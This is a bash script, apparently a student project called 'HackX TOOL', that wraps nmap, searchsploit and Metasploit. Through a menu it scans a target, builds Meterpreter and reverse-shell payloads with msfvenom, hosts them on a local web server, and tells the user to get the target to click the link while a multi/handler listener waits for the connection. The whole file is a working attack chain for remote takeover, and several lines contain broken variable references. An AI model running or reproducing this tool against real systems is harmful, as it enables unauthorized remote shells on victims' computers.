#!/bin/bash

function SPACER()
{
	echo "======================="
	echo "+******TASK $OPTION*******+"
	echo "+                     +"
	echo "======================="
}
function SPACER2()
{
	echo "======================="
}
#Defining payload types
payload1="x86/meterpreter/reverse_tcp"
payload2="x86/meterpreter/reverse_http"
payload3="x64/meterpreter_reverse_tcp"
payload4="x64/meterpreter_reverse_http"
payload5="cmd/unix/reverse"
payload6="x86/shell/reverse_tcp" 

expl="exploit/multi/handler"
			
#########Include RUN as root script


function HACKX()
{
	figlet -w 70 "HackX TOOL by"
	figlet -w 70 "TCN Group-3"
	echo "What Operation Will You Like To Carry Out On Target"
	echo " (01) Scan For Open Ports only"
	echo " (02) Scan For Vulnerabilities only"
	echo " (03) Create a payload for an attack"
	echo " (04) Create a payload and listener "
	echo "  "
	read -p " Enter a number to choose an operation..: " OPTION
	clear
SPACER
	case $OPTION in
		01)
			
			read -p "Enter  RHOST: " Rhost
			echo " [*] Scanning top 100 ports ...."
			nmap -sV -F $Rhost > rhost.dtls 
			echo " "
			echo "The following ports are opened on your target"
			SPACER2
			cat rhost.dtls | grep -w open | awk '{print$1,"--",$3}' 
			echo " "
			echo " "
			read -p " Press (1) to return to Menu or (0) to Exit " CHOICE
			clear
				case $CHOICE in
					1) 
						HACKX
					;;
		
					2)
						exit
					;;
				esac
		;;
		
		02)
			echo "[+] scanning for vulnerabilities...."
			read -p "Enter  RHOST: " Rhost
			read -p "Enter RHOST platform  [windows/linux]:  " Platform
			echo " [*] Scanning  ...."
			nmap  -sV  -F  $Rhost -oX rhost.xml >/dev/null
			searchsploit --nmap rhost.xml 2>/dev/null | grep $Platform > rhost2.lst
			clear
			SPACER
			echo " Common Vulnerabilities found..."
			SPACER2
			cat rhost2.lst
			echo " "
			echo " "
			read -p " Press (1) to return to Menu or (0) to Exit " CHOICE
			clear
				case $CHOICE in
					1) 
						HACKX
					;;
		
					2)
						exit
					;;
				esac
		;;
		
		03)
			
			echo "Enter details of payload"
			
			read -p "Enter  LHOST: " LHOST
			read -p "Enter  LPORT: " LPORT
			read -p "Enter payload file format:  " FORMAT
			read -p "Enter desired filename for payload:  " FILENAME
			SPACER2
			SPACER2
			echo " Select payload type"
			echo "[1] $payload1"
			echo "[2] $payload2"
			echo "[3] $payload3"
			echo "[4] $payload4"
			echo "[5] $payload5"
			echo "[6] $payload6" 
			
			SPACER2
			read -p "Enter a number to choose a payload..: " PAYLOAD
			read -p "Choose a platform [windows or linux]? :" Platform3
			SPACER2
			echo "[+] Creating a payload for attack...."
						
			#msfvenom -l payloads |grep $Platform3 |grep meterpreter/reverse_tcp
			case $PAYLOAD in
				
				1)
				   msfvenom -p $Platform3/$payload1_tcp lhost=$LHOST lport=$LPORT -f $FORMAT -o $FILENAME.$FORMAT
				;;
				
				2)
					msfvenom -p $Platform3/$payload2_http lhost=$LHOST lport=$LPORT -f $FORMAT -o $FILENAME.$FORMAT
				;;
				
				3)
					msfvenom -p $Platform3/$payload3_tcp lhost=$LHOST lport=$LPORT -f $FORMAT -o $FILENAME.$FORMAT
				;;
				
				4)
					msfvenom -p $Platform3/$payload4_http lhost=$LHOST lport=$LPORT -f $FORMAT -o $FILENAME.$FORMAT
				;;
				
				5)
					msfvenom -p $Platform3/$payload5 lhost=$LHOST lport=$LPORT -f $FORMAT -o $FILENAME.$FORMAT
				;;
				
				6)
					msfvenom -p $Platform3/$payload6 lhost=$LHOST lport=$LPORT -f $FORMAT -o $FILENAME.$FORMAT
				;;
					
			esac
				echo "Payload has been saved to $(pwd) "
						
			echo " "
			echo " "
			read -p " Press (1) to return to Menu or (0) to Exit " CHOICE
			clear
				case $CHOICE in
					1) 
						HACKX
					;;
		
					2)
						exit
					;;
				esac
			
			
		;;
		
		04)
			
			echo "[*] Settting up your attack stage ...."
			ipadd="$(ifconfig |grep -w inet|head -1|awk '{print$2}')"
			python3 -m http.server &
			sleep 10
			echo " Send this link http://$ipadd:8000/$FILENAME.$FORMAT to your target and get them to click"

			echo "[*] Settting up your RC listener tool stage...."
			echo " "
			read -p "Enter  LHOST: " lhost
			read -p "Enter LPORT: " lport
			read -p "Target OS for payload [windows or linux]? :" platform4
			echo " "
			echo "Payload Options"
			SPACER2
			echo "[1] $payload1"
			echo "[2] $payload2"
			echo "[3] $payload3"
			echo "[4] $payload4"
			echo "[5] $payload5"
			echo "[6] $payload6" 
			echo " "
			SPACER2
			read -p "Select Payload from [1-6]: " PayOPT
			[*] Setting up listener .... ... .. .
			
			case $PayOPT in
				
				1)
				   msfconsole -q -x "use $expl; set PAYLOAD $platform4/$payload1; set LHOST $lhost; set LPORT $lport; exploit"
				;;
				
				2)
					msfconsole -q -x "use $expl; set PAYLOAD $platform4/$payload2; set LHOST $lhost; set LPORT $lport; exploit"
				;;
				
				3)
					msfconsole -q -x "use $expl; set PAYLOAD $platform4/$payload3; set LHOST $lhost; set LPORT $lport; exploit"
				;;
				
				4)
					msfconsole -q -x "use $expl; set PAYLOAD $platform4/$payload4; set LHOST $lhost; set LPORT $lport; exploit"
				;;
				
				5)
					msfconsole -q -x "use $expl; set PAYLOAD $platform4/$payload5; set LHOST $lhost; set LPORT $lport; exploit"
				;;
				
				6)
					msfconsole -q -x "use $expl; set PAYLOAD $platform4/$payload6; set LHOST $lhost; set LPORT $lport; exploit"
				;;
					
			esac
			
			echo " "
			echo " "
			read -p " Press (1) to return to Menu or (0) to Exit " CHOICE
			clear
				case $CHOICE in
					1) 
						HACKX
					;;
		
					2)
						exit
					;;
				esac
		;;
		esac
}

HACKX




